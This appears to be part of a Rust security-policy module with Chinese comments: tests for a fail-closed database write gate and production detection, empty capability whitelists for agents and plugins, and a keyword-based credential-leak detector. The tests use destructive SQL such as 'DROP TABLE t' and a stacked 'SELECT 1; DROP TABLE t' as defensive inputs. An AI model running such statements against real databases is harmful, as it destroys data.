        assert_eq!(is_production_database(&s), ProductionVerdict::Production);
    }

    #[test]
    fn unencrypted_public_host_verdict_is_unknown() {
        // S4：非回环且实际未加密 ⇒ Unknown
        let mut s = remote("db.example.com", "app");
        s.encrypted = Some(false);
        assert_eq!(is_production_database(&s), ProductionVerdict::Unknown);
    }

    #[test]
    fn bare_sqlite_without_topology_signal_is_unknown() {
        // 契约规则 4「无任何信号 ⇒ Unknown」：SQLite 本地文件若调用方不给拓扑信号，
        // 按生产处理（fail-closed）。调用方认为本地文件等价回环时须显式传
        // `host_is_loopback_or_private = Some(true)`。（契约歧义 O-A4-1，待 A0 确认）
        let s = ProductionSignals {
            is_sqlite: true,
            host: None,
            database: "/data/app.db",
            production_hint: None,
            host_is_loopback_or_private: None,
            encrypted: None,
        };
        assert_eq!(is_production_database(&s), ProductionVerdict::Unknown);

        let mut marked = s;
        marked.host_is_loopback_or_private = Some(true);
        assert_eq!(
            is_production_database(&marked),
            ProductionVerdict::NonProduction
        );
    }

    // ---------- 命令层闸门组合（evaluate_db_query_gate）----------

    fn sample_cfg(
        kind: SupportedDb,
        host: Option<&str>,
        database: &str,
        production_hint: Option<bool>,
        allow_write: bool,
    ) -> DbConnectionConfig {
        DbConnectionConfig {
            id: "conn-test".to_string(),
            name: "test".to_string(),
            kind,
            host: host.map(|h| h.to_string()),
            port: None,
            database: database.to_string(),
            username: None,
            ssl_mode: crate::domain::DbSslMode::Disable,
            allow_write,
            production_hint,
            enabled: true,
            created_at: chrono::Utc::now(),
            updated_at: chrono::Utc::now(),
        }
    }

    #[test]
    fn gate_allows_read_on_production() {
        // 只读查询即使在生产库也放行（只读不破坏数据）
        let cfg = sample_cfg(
            SupportedDb::MySql,
            Some("10.0.0.5"),
            "app",
            Some(true),
            false,
        );
        assert_eq!(
            evaluate_db_query_gate("SELECT * FROM t", &cfg, Some(true), false),
            Ok(())
        );
    }

    #[test]
    fn gate_denies_write_on_production_even_with_confirm() {
        let cfg = sample_cfg(
            SupportedDb::Postgres,
            Some("10.0.0.5"),
            "app",
            Some(true),
            true,
        );
        assert_eq!(
            evaluate_db_query_gate("DELETE FROM t", &cfg, Some(true), true),
            Err(DbErrorCode::WriteDenied)
        );
    }

    #[test]
    fn gate_denies_unparsable_sql() {
        let cfg = sample_cfg(SupportedDb::Sqlite, Some("127.0.0.1"), "x.db", None, true);
        assert_eq!(
            evaluate_db_query_gate("/*unterminated", &cfg, None, true),
            Err(DbErrorCode::SqlParseFailed)
        );
    }

    #[test]
    fn gate_allows_confirmed_write_on_nonprod() {
        let cfg = sample_cfg(SupportedDb::Sqlite, Some("127.0.0.1"), "x.db", None, true);
        assert_eq!(
            evaluate_db_query_gate("UPDATE t SET a = 1", &cfg, None, true),
            Ok(())
        );
    }

    #[test]
    fn gate_denies_write_without_second_confirmation() {
        let cfg = sample_cfg(SupportedDb::Sqlite, Some("127.0.0.1"), "x.db", None, true);
        assert_eq!(
            evaluate_db_query_gate("UPDATE t SET a = 1", &cfg, None, false),
            Err(DbErrorCode::WriteDenied)
        );
    }

    // ---------- fail-closed 写闸门 ----------

    #[test]
    fn write_is_denied_by_default() {
        let c = classify_sql_risk("UPDATE t SET a = 1");
        assert_eq!(
            require_write_confirmation(&c, ProductionVerdict::NonProduction, false, false),
            Err(DbErrorCode::WriteDenied)
        );
    }

    #[test]
    fn write_on_unknown_production_is_denied() {
        let c = classify_sql_risk("DELETE FROM t WHERE id = 1");
        assert_eq!(
            require_write_confirmation(&c, ProductionVerdict::Unknown, true, true),
            Err(DbErrorCode::ProductionUnknown),
            "生产判定不确定必须拒绝写"
        );
    }

    #[test]
    fn write_on_production_is_denied() {
        let c = classify_sql_risk("DELETE FROM t WHERE id = 1");
        assert_eq!(
            require_write_confirmation(&c, ProductionVerdict::Production, true, true),
            Err(DbErrorCode::WriteDenied)
        );
    }

    #[test]
    fn write_without_second_confirmation_is_denied() {
        let c = classify_sql_risk("INSERT INTO t (a) VALUES (1)");
        assert_eq!(
            require_write_confirmation(&c, ProductionVerdict::NonProduction, true, false),
            Err(DbErrorCode::WriteDenied)
        );
    }

    #[test]
    fn write_allowed_only_when_all_gates_pass() {
        let c = classify_sql_risk("INSERT INTO t (a) VALUES (1)");
        assert_eq!(
            require_write_confirmation(&c, ProductionVerdict::NonProduction, true, true),
            Ok(())
        );
    }

    #[test]
    fn ddl_is_never_allowed_even_with_all_gates() {
        let c = classify_sql_risk("DROP TABLE t");
        assert_eq!(
            require_write_confirmation(&c, ProductionVerdict::NonProduction, true, true),
            Err(DbErrorCode::WriteDenied),
            "首期不给 DDL 放行通道"
        );
    }

    #[test]
    fn unparsable_statement_is_denied_by_write_gate() {
        let c = classify_sql_risk("/*unterminated");
        assert_eq!(
            require_write_confirmation(&c, ProductionVerdict::NonProduction, true, true),
            Err(DbErrorCode::SqlParseFailed)
        );
    }

    #[test]
    fn read_query_bypasses_write_gate() {
        let c = classify_sql_risk("SELECT * FROM t");
        assert_eq!(
            require_write_confirmation(&c, ProductionVerdict::Unknown, false, false),
            Ok(()),
            "只读查询不受写闸门限制"
        );
    }

    #[test]
    fn multiple_statements_are_denied_by_write_gate() {
        let c = classify_sql_risk("SELECT 1; DROP TABLE t");
        assert_eq!(
            require_write_confirmation(&c, ProductionVerdict::NonProduction, true, true),
            Err(DbErrorCode::MultipleStatements)
        );
    }
}

// ===========================================================================
// M5-4 / M5-5 Agent/Skill 能力白名单与校验（Lane A5, W4）
//
// 能力白名单**单一真源**：Skill / Agent / MCP / Plugin / A2A 共用本文件，
// 禁止在多处各自定义（由 `check-agent-skill-policy.py` 的 AGSK_7 守门）。
// 首期列表为空：能力须逐个评估后追加；非空引用在列表未定义前 fail-closed。
// ===========================================================================

/// Skill 能力白名单（v1）。追加新能力时同步更新本常量与调用方校验。
pub const SKILL_CAPABILITY_V1: &[&str] = &[];

/// Agent 能力白名单（v1）。
pub const AGENT_CAPABILITY_V1: &[&str] = &[];

/// 判断一段文本是否疑似包含凭据/密钥（fail-closed 保守匹配）。
pub fn contains_credential_leak(s: &str) -> bool {
    let l = s.to_ascii_lowercase();
    l.contains("sk-")
        || l.contains("api_key")
        || l.contains("apikey")
        || l.contains("secret")
        || l.contains("password")
        || l.contains("authorization")
        || l.contains("bearer")
        || l.contains("x-api-key")
        || l.contains("private_key")
}

/// 校验 Skill 声明的能力是否全部登记（单一真源）。
pub fn check_skill_capabilities(ids: &[String]) -> Result<(), PolicyError> {
    for id in ids {
        if !SKILL_CAPABILITY_V1.contains(&id.as_str()) {
            return Err(PolicyError::UnknownCapability(id.clone()));
        }
    }
    Ok(())
}

/// 校验 Agent 声明的能力是否全部登记（单一真源）。
pub fn check_agent_capabilities(ids: &[String]) -> Result<(), PolicyError> {
    for id in ids {
        if !AGENT_CAPABILITY_V1.contains(&id.as_str()) {
            return Err(PolicyError::UnknownCapability(id.clone()));
        }
    }
    Ok(())
}

/// Plugin 能力白名单（v1）。与 SKILL / AGENT_CAPABILITY_V1 同文件（单一真源），
/// 承 security_policy.rs §M5-4/5 头注释「Skill / Agent / MCP / Plugin / A2A 共用本文件」。
/// ⚠️ 与 MCP_CAPABILITY_V1 当前分处两文件（MCP 在 domain.rs），系 W4 已记录的能力真源
/// 碎片化待收口项；W6 A9 将 Plugin 落在 security_policy.rs 以贴合该头注释意图，
/// 不破坏既有 A3/A5 门禁。
pub const PLUGIN_CAPABILITY_V1: &[&str] = &[];

/// 校验 Plugin 声明的能力是否全部登记（单一真源）。
pub fn check_plugin_capabilities(ids: &[String]) -> Result<(), PolicyError> {
    for id in ids {
        if !PLUGIN_CAPABILITY_V1.contains(&id.as_str()) {
            return Err(PolicyError::UnknownCapability(id.clone()));
        }
    }
    Ok(())
}

#[cfg(test)]
mod plugin_capability_tests {
    use super::*;

    #[test]
    fn plugin_capability_whitelist_empty_accepts_nothing() {
        // 首期白名单为空：任何能力声明都按 fail-closed 拒绝。
        assert!(check_plugin_capabilities(&vec![]).is_ok());
        assert!(matches!(
            check_plugin_capabilities(&vec!["fs_write".to_string()]),
            Err(PolicyError::UnknownCapability(_))
        ));
    }
}

#[cfg(test)]
mod agent_skill_policy_tests {
    use super::*;

    #[test]
    fn empty_skill_capabilities_pass() {
        assert!(check_skill_capabilities(&[]).is_ok());
    }

    #[test]
    fn unknown_skill_capability_rejected() {
        assert!(matches!(
            check_skill_capabilities(&["file_read".to_string()]),
            Err(PolicyError::UnknownCapability(_))
        ));
    }

    #[test]
    fn credential_leak_detects_sk_and_bearer() {
        assert!(contains_credential_leak("my token is sk-abc123XYZ"));
        assert!(contains_credential_leak("Authorization: Bearer xyz"));
        assert!(!contains_credential_leak("list all artifacts"));
    }
}
